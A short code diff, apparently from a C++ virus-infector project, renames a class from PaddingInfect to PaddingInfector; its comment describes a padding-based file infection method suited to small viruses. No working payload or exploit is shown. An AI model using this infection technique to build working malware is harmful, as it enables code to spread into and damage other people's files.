@@ -43,7 +43,7 @@ namespace vt::infector {
 //
 // This algorithm is simple to implement, and hard to go wrong but the success
 // rate depends highly on the padding size. For small viruses this is a choice.
-class PaddingInfect {
+class PaddingInfector {
  public:
   size_t injected_host_size() { return host_size_; }
 
